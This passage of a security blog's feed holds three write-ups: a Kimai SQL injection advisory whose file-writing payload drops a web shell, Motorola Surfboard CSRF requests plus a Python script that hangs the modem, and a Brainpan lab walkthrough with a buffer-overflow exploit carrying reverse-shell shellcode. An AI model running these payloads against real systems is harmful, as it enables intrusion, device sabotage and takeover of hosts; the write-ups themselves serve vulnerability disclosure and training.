+</span><span class='line'>
+</span><span class='line'>if __name__=="__main__":
+</span><span class='line'>    run(parse())</span></code></pre></td></tr></table></div></figure>
+
+
+<p><a href="http://www.exploit-db.com/exploits/25915/">Exploit</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Kimai v0.9.2 - SQLi]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/05/21/kimai-v0.9.2-sqli/"/>
+    <updated>2013-05-21T00:01:44-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/05/21/kimai-v0.9.2-sqli</id>
+    <content type="html"><![CDATA[<p>Kimai is a time tracking solution built on the typical LAMP stack.  Multiple vulnerabilities were discovered that could allow remote code execution on the remote server.  These appear to be fixed in their source repository (<a href="https://github.com/kimai/kimai">here</a>), but none of the distribution packages (<a href="https://downloads.sourceforge.net/project/kimai/0.9.x/kimai.0.9.2.1306-3.zip">v0.9.2.1306-3</a>) have the patched version.</p>
+
+<p>On installation, a default administrative account is generated with the following credentials: admin:changeme.  The /install/ folder is not automatically deleted, but instead a pop-up is shown each time the administrator logs in, alerting them that they should delete this folder in order to protect their system from malicious modifications.  If this folder is not deleted, it could allow unauthenticated users the ability to wipe the remote system&rsquo;s install of Kimai.</p>
+
+<p>There are multiple directory indexes (<code>/kimai/libraries/</code>) that disclose paths, version information, and files, as well as path disclosure (<code>/kimai/error.php?err=db</code>):</p>
+
+<p><img class="center" src="http://1.bp.blogspot.com/-FQ9oSQqSVEs/UZp1oyYlMkI/AAAAAAAAAeY/c8JuSaxjRW0/s640/kimai_path.jpg"></p>
+
+<p>The file <code>/kimai/db_restore.php</code> is an experimental page that can be used to restore, delete, and create backups of the Kimai system.  This page can be accessed without authentication or authorization, and no audit log is generated.  This page is vulnerable to SQLi when restoring a generated backup.</p>
+
+<p>Once a backup is created, the recovery POST appears as such:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>POST /kimai/db_restore.php HTTP/1.1
+</span><span class='line'>Host: 192.168.1.219
+</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0
+</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span class='line'>Accept-Language: en-US,en;q=0.5
+</span><span class='line'>Accept-Encoding: gzip, deflate
+</span><span class='line'>DNT: 1
+</span><span class='line'>Referer: http://192.168.1.219/kimai/db_restore.php
+</span><span class='line'>Connection: keep-alive
+</span><span class='line'>Content-Type: application/x-www-form-urlencoded
+</span><span class='line'>Content-Length: 37
+</span><span class='line'>
+</span><span class='line'>dates%5B%5D=1369028276&submit=recover</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The initial request is pulled in from the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>if (isset($_REQUEST['submit'])) 
+</span><span class='line'>{
+</span><span class='line'>    if (($_REQUEST['submit'] == $kga['lang']['backup'][2]) && (isset($_REQUEST['dates']))) 
+</span><span class='line'>    {
+</span><span class='line'>        $dates = $_REQUEST['dates'];</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The tables are then queried, and the following code is executed:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  // Bis rev 733 gab es in tabelle ldr keinen Primary Key ...
+</span><span class='line'>        $query = "SELECT value FROM kimai_bak_" . $dates[0] . "_kimai_var WHERE var = 'revision' LIMIT 0,1;";
+</span><span class='line'>   
+</span><span class='line'>        if ($kga['server_conn'] == "pdo") {
+</span><span class='line'>                if (is_object($pdo_conn)) {
+</span><span class='line'>                    $pdo_query = $pdo_conn-&gt;prepare($query);
+</span><span class='line'>                    $success = $pdo_query-&gt;execute(array());
+</span><span class='line'>                $revision = $pdo_query-&gt;fetch(PDO::FETCH_ASSOC);
+</span><span class='line'>                }
+</span><span class='line'>        } else {
+</span><span class='line'>            if (is_object($conn)) {
+</span><span class='line'>                $success = $conn-&gt;Query($query);
+</span><span class='line'>            $revision = $conn-&gt;RowArray(0,MYSQL_ASSOC);
+</span><span class='line'>            }
+</span><span class='line'>        }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <code>dates</code> parameter is used within the query without sanitization, leading to a classic SQL injection vulnerability.  This is quite serious as the page is accessible without needing to be authenticated or authorized to the Kimai system.</p>
+
+<p>We can exploit this by generating a new backup, and running a typical SQLi, where the POST data appears as such:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>dates%5B%5D=1369028276_kimai_var%20UNION%20SELECT%20INTO%20OUTFILE%20'hacked';--%20&submit=recover</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This will dump all output from the query into the file &lsquo;hacked&rsquo; on the remote server.  Using this, we can dump one column from any table in the database.</p>
+
+<p>Passwords are stored using the following:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$passCrypt = md5($kga['password_salt'].$password.$kga['password_salt']);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is quite weak, as the salt is static for each user and can be pulled from the include/autoconf.php file.</p>
+
+<p>Session&rsquo;s do not enforce any form of source verification, and thusly can be hijacked.</p>
+
+<p>Here&rsquo;s a run from the script:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# python kimai_sqli.py -i 192.168.1.83 -w
+</span><span class='line'>[!] Using backup id 1369074792
+</span><span class='line'>[!] Shell dropped.  Go hit http://192.168.1.83/kimai/41e93.php?rr=ls
+</span><span class='line'>root@kali:~# </span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="src" src="http://3.bp.blogspot.com/-N4SxE1sJCMI/UZpyu-ABNWI/AAAAAAAAAeM/mJREYhveVCs/s640/kimai_run.jpg"></p>
+
+<p><a href="http://www.exploit-db.com/exploits/25606/">Exploit</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Motorola Surfboard - Multiple Vulnerabilities]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/04/21/motorola-surfboard-multiple-vulnerabilities/"/>
+    <updated>2013-04-21T00:06:45-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/04/21/motorola-surfboard-multiple-vulnerabilities</id>
+    <content type="html"><![CDATA[<p>It would appear that these vulnerabilities were disclosed a few years ago (<a href="http://www.cvedetails.com/cve/CVE-2008-2002/">CVE-2008-2002</a> and <a href="http://www.cvedetails.com/cve/CVE-2006-5196/">CVE-2006-5196</a>), but my relatively new (1-2 years) Motorola Surfboard SB5101U (verified against both the 101 and 101U), loaded with SB5101NU-2.1.7.0-GA-00-388-NOSH, appears to be vulnerable to the same CSRF&rsquo;s exposed prior.  With no authentication system in place at all, it would appear that a local DoS is not much of a concern to them.  It&rsquo;s interesting that, despite the sudden flood of discovered vulnerabilities in routers, nobody is really taking a look at the other piece of hardware between you and the ISP.  As I poked about this modem, I discovered a few other interesting things.</p>
+
+<p>First, here&rsquo;s the POST to reset the modem to factory defaults:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>POST /goform/RgConfig HTTP/1.1
+</span><span class='line'>Host: 192.168.100.1
+</span><span class='line'>Proxy-Connection: keep-alive
+</span><span class='line'>Content-Length: 34
+</span><span class='line'>Cache-Control: max-age=0
+</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span class='line'>Origin: http://192.168.100.1
+</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22
+</span><span class='line'>Content-Type: application/x-www-form-urlencoded
+</span><span class='line'>Referer: http://192.168.100.1/RgConfig.asp
+</span><span class='line'>Accept-Encoding: gzip,deflate,sdch
+</span><span class='line'>Accept-Language: en-US,en;q=0.8
+</span><span class='line'>Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
+</span><span class='line'>
+</span><span class='line'>RestoreFactoryDefault=1&ResetReq=0</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And the POST for restarting the modem:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>POST /goform/RgConfig HTTP/1.1
+</span><span class='line'>Host: 192.168.100.1
+</span><span class='line'>Proxy-Connection: keep-alive
+</span><span class='line'>Content-Length: 34
+</span><span class='line'>Cache-Control: max-age=0
+</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span class='line'>Origin: http://192.168.100.1
+</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22
+</span><span class='line'>Content-Type: application/x-www-form-urlencoded
+</span><span class='line'>Referer: http://192.168.100.1/RgConfig.asp
+</span><span class='line'>Accept-Encoding: gzip,deflate,sdch
+</span><span class='line'>Accept-Language: en-US,en;q=0.8
+</span><span class='line'>Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
+</span><span class='line'>
+</span><span class='line'>RestoreFactoryDefault=0&ResetReq=1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This page also appears to allow the user the ability to modify modem settings by intercepting the response and modifying a javascript flag:</p>
+
+<p><img class="center" src="http://3.bp.blogspot.com/-SJ6LsHU8-28/UVeuZzI105I/AAAAAAAAAcM/5T3qv2jygZI/s640/config_mod.jpg"></p>
+
+<p>Once we flip the flag var from 1 to 0, we have write access via the web interface.  The write POST is as follows:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>POST /goform/RgConfig HTTP/1.1
+</span><span class='line'>Host: 192.168.100.1
+</span><span class='line'>Proxy-Connection: keep-alive
+</span><span class='line'>Content-Length: 125
+</span><span class='line'>Cache-Control: max-age=0
+</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span class='line'>Origin: http://192.168.100.1
+</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22
+</span><span class='line'>Content-Type: application/x-www-form-urlencoded
+</span><span class='line'>Referer: http://192.168.100.1/RgConfig.asp
+</span><span class='line'>Accept-Encoding: gzip,deflate,sdch
+</span><span class='line'>Accept-Language: en-US,en;q=0.8
+</span><span class='line'>Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3
+</span><span class='line'>
+</span><span class='line'>CmFrequencyPlan=0&CmUpChannelId=1&CmDownstreamFreq=843000000&CmDhcpServer=on&saveChanges=1&RestoreFactoryDefault=0&ResetReq=0</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With this we can totally brick the device (that is, until someone figures all this out) by modifying the stream frequency as follows:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>CmFrequencyPlan=0&CmUpChannelId=0&CmDownstreamFreq=-843000000&CmDhcpServer=on&saveChanges=1&RestoreFactoryDefault=0&ResetReq=0</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This can be fixed by simply restoring the configuration to the factory default through the web interface.  However: with an incomplete HTTP HEAD request, we can completely DoS the web server rendering any attempt to access it from the local network moot.  The code:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import socket
+</span><span class='line'>
+</span><span class='line'>request = 'HEAD / HTTP/1.1\r\n'\
+</span><span class='line'>          'Connection: Keep-Alive\r\n'\
+</span><span class='line'>          'Content-Length: 50\r\n'\
+</span><span class='line'>          'Host: 192.168.100.1\r\n\r\n'
+</span><span class='line'>try:
+</span><span class='line'>    sock = socket.socket()
+</span><span class='line'>    sock.connect(('192.168.100.1', 80))
+</span><span class='line'>    sock.send(request)
+</span><span class='line'>    print 'Holding the flag...'
+</span><span class='line'>    data = sock.recv(1024)
+</span><span class='line'>except Exception, e: print e
+</span><span class='line'>except KeyboardInterrupt: sock.close()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Because the web server does not have the entire request, it waits for it in another packet.  Which, of course, never arrives.  We can test this by removing the Content-Length field, which will automatically then close the socket.  Between these two vulnerabilities, the modem is essentially rendered useless until hard booted.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[solving brainpan]]></title>
+    <link href="http://hatRiot.github.io/blog/2013/04/03/solving-brainpan/"/>
+    <updated>2013-04-03T00:09:43-06:00</updated>
+    <id>http://hatRiot.github.io/blog/2013/04/03/solving-brainpan</id>
+    <content type="html"><![CDATA[<p>Brainpan is the brainchild of superkojiman over at vulnhub, and has some pretty interesting (and frustrating)  twists and turns.  This boot2root is more focused on exploitation of 0days in custom written software, with no metasploit modules or google hunting necessary.  With that, the nmap:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@127:~# nmap -sS -A -p- -T5 192.168.1.110
+</span><span class='line'>
+</span><span class='line'>Starting Nmap 6.25 ( http://nmap.org ) at 2013-03-27 22:06 CDT
+</span><span class='line'>Nmap scan report for brainpan (192.168.1.110)
+</span><span class='line'>Host is up (0.00040s latency).
+</span><span class='line'>Not shown: 65533 closed ports
+</span><span class='line'>PORT      STATE SERVICE VERSION
+</span><span class='line'>9999/tcp  open  abyss?
+</span><span class='line'>10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
+</span><span class='line'>| ndmp-version: 
+</span><span class='line'>|_  ERROR: Failed to get host information from server</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Port 10000 just serves up a page about various exploit statistics in web apps, but 9999 serves up a login page:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@127:~# nc 192.168.1.110 9999
+</span><span class='line'>_|                            _|                                        
+</span><span class='line'>_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
+</span><span class='line'>_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+</span><span class='line'>_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+</span><span class='line'>_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+</span><span class='line'>                                            _|                          
+</span><span class='line'>                                            _|
+</span><span class='line'>
+</span><span class='line'>[________________________ WELCOME TO BRAINPAN _________________________]
+</span><span class='line'>                          ENTER THE PASSWORD                              
+</span><span class='line'>
+</span><span class='line'>                          &gt;&gt; whoareyou
+</span><span class='line'>                          ACCESS DENIED
+</span><span class='line'>root@127:~# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>That&rsquo;s it.  I tried a few basic injections and default passwords to no avail.  I fired up DirBuster to see what I could find, and very quickly I stumped onto <code>/bin/</code>, which contained a single file, <code>brainpan.exe</code>.  I loaded this up into a debugger to see what was inside:</p>
+
+<p><img class="center" src="http://4.bp.blogspot.com/-XGWNxG1FbCY/UVPCvoJc0LI/AAAAAAAAAbc/J-HSrap9_jw/s640/brainpan.jpg"></p>
+
+<p>It appeared that our password was <code>shitstorm</code>, following a strcpy of the incoming buffer.  I fired up the .exe in a VM to see what it did:</p>
+
+<p><img class="center" src="http://4.bp.blogspot.com/-YnR2vlwbgIs/UVPDmWYEZWI/AAAAAAAAAbk/ZOLdSGpMovg/s640/brainpan_loaded.jpg"></p>
+
+<p>Looks like this is just a copy of the program that is running in the virtual machine, and according to my registers, vulnerable:</p>
+
+<p><img class="center" src="http://3.bp.blogspot.com/-uR5L_LXkS8o/UVPEtg3qFXI/AAAAAAAAAbs/zgjG9FTKst0/s640/brainpan_asploded.jpg"></p>
+
+<p>So it appears we need to attach to the login form and see if we can get it to explode with shell execution.  I find it interesting that we were given a copy of the file as a exe instead of an ELF, considering what the host is running.</p>
+
+<p>Exploiting this particular binary was not hard, but I ran into an issue that made it more difficult than it should&rsquo;ve been.  This is a very straightforward stack-based buffer overflow, but continually my stack would get corrupted and shift by one or two bytes:</p>
+
+<p><img class="center" src="http://2.bp.blogspot.com/-c19Y3eKE7cE/UVWx2YwTsrI/AAAAAAAAAb8/Rg-_YzDb8n4/s640/wat.jpg"></p>
+
+<p>To mitigate this, instead of my payload looking like this: <code>[524 bytes of junk | JMP ESP | NOPs | shellcode]</code></p>
+
+<p>I had to jump a little further back to take advantage of some extra instructions: <code>[520 bytes of junk | 4 NOP bytes | PUSH EBP; MOV EBP,ESP JMP ESP | NOPs | shellcode]</code></p>
+
+<p>This aligned my stack properly and allowed me to run a reverse shell.  Here&rsquo;s the exploit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import socket
+</span><span class='line'>
+</span><span class='line'># msfpayload linux/x86/shell_reverse_tcp LHOST=192.168.1.74 LPORT=443 R | msfencode -e x86/shikata_ga_nai -t c
+</span><span class='line'>#[*] x86/shikata_ga_nai succeeded with size 95 (iteration=1)
+</span><span class='line'>
+</span><span class='line'>shell = "\xdb\xc8\xbf\x12\xad\xd5\x16\xd9\x74\x24\xf4\x58\x29\xc9\xb1"\
+</span><span class='line'>        "\x12\x31\x78\x17\x03\x78\x17\x83\xfa\x51\x37\xe3\xcb\x72\x4f"\
+</span><span class='line'>        "\xef\x78\xc6\xe3\x9a\x7c\x41\xe2\xeb\xe6\x9c\x65\x98\xbf\xae"\
+</span><span class='line'>        "\x59\x52\xbf\x86\xdc\x95\xd7\xd8\xb7\x67\x6d\xb1\xc5\x67\x70"\
+</span><span class='line'>        "\xfa\x43\x86\xc2\x9a\x03\x18\x71\xd0\xa7\x13\x94\xdb\x28\x71"\
+</span><span class='line'>        "\x3e\xcb\x07\x05\xd6\x7b\x77\x8b\x4f\x12\x0e\xa8\xdd\xb9\x99"\
+</span><span class='line'>        "\xce\x51\x36\x57\x90";
+</span><span class='line'>
+</span><span class='line'>try:
+</span><span class='line'>    payload = '\x41' * 520        #junk
+</span><span class='line'>    payload += '\x90'*4           #ebp
+</span><span class='line'>    payload += '\xf0\x12\x17\x31' #push ebp; mov ebp,esp; jmp esp
+</span><span class='line'>    payload += '\x90'*50          #nop sled
+</span><span class='line'>    payload += shell              #shellcode
+</span><span class='line'>
+</span><span class='line'>    s = socket.socket()
+</span><span class='line'>    s.connect(('192.168.1.110', 9999))
+</span><span class='line'>    s.recv(1024)
+</span><span class='line'>    s.send(payload)
+</span><span class='line'>except Exception, e: print e</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I then had a connected shell waiting for me on 192.168.1.74; a bit of enumeration:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ whoami  
+</span><span class='line'>puck
+</span><span class='line'>$ uname -a
+</span><span class='line'>Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux
+</span><span class='line'>$ id
+</span><span class='line'>uid=1002(puck) gid=1002(puck) groups=1002(puck)
+</span><span class='line'>$ ls /home/
+</span><span class='line'>anansi
+</span><span class='line'>puck
+</span><span class='line'>reynard</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To ease my curiousity about the ELF/EXE web server running:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat /home/puck/checksrv.sh
+</span><span class='line'>#!/bin/bash
+</span><span class='line'># run brainpan.exe if it stops
+</span><span class='line'>lsof -i:9999
+</span><span class='line'>if [[ $? -eq 1 ]]; then 
+</span><span class='line'>    pid=`ps aux | grep brainpan.exe | grep -v grep`
+</span><span class='line'>    if [[ ! -z $pid ]]; then
+</span><span class='line'>        kill -9 $pid
+</span><span class='line'>        killall wineserver
+</span><span class='line'>        killall winedevice.exe
+</span><span class='line'>    fi
+</span><span class='line'>    /usr/bin/wine /home/puck/web/bin/brainpan.exe &
+</span><span class='line'>fi 
+</span><span class='line'>
+</span><span class='line'># run SimpleHTTPServer if it stops
+</span><span class='line'>lsof -i:10000
+</span><span class='line'>if [[ $? -eq 1 ]]; then 
+</span><span class='line'>    pid=`ps aux | grep SimpleHTTPServer | grep -v grep`
+</span><span class='line'>    if [[ ! -z $pid ]]; then
+</span><span class='line'>        kill -9 $pid
+</span><span class='line'>    fi
+</span><span class='line'>    cd /home/puck/web
+</span><span class='line'>    /usr/bin/python -m SimpleHTTPServer 10000
+</span><span class='line'>fi </span></code></pre></td></tr></table></div></figure>
+
+
+<p>It&rsquo;s not actually an elf, but an exe that&rsquo;s running under WINE.  Another interesting bit:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ which gcc
+</span><span class='line'>$ which cc
+</span><span class='line'>$ which gdb
+</span><span class='line'>$ which objdump</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So if we happen to find any more binaries to exploit, we need to hack on it blind.  And in this case&hellip;</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ find / -perm +6000 -type f -exec ls -ld {} \; &gt; setuid; echo done
+</span><span class='line'>$ cat setuid
+</span><span class='line'>-rwsr-xr-x 1 root root 63632 Sep  6  2012 /bin/umount
+</span><span class='line'>-rwsr-xr-x 1 root root 31124 Sep  6  2012 /bin/su
+</span><span class='line'>-rwsr-xr-x 1 root root 88768 Sep  6  2012 /bin/mount
+</span><span class='line'>-rwsr-xr-x 1 root root 30112 Jun 11  2012 /bin/fusermount
+</span><span class='line'>-rwsr-xr-x 1 root root 39124 Oct  2 17:26 /bin/ping6
+</span><span class='line'>-rwsr-xr-x 1 root root 34780 Oct  2 17:26 /bin/ping
+</span><span class='line'>-rwxr-sr-x 1 root tty 18056 Sep  6  2012 /usr/bin/wall
+</span><span class='line'>-rwsr-xr-x 2 root root 115140 Feb 27 14:27 /usr/bin/sudo
+</span><span class='line'>-rwxr-sr-x 1 root shadow 45292 Sep  6  2012 /usr/bin/chage
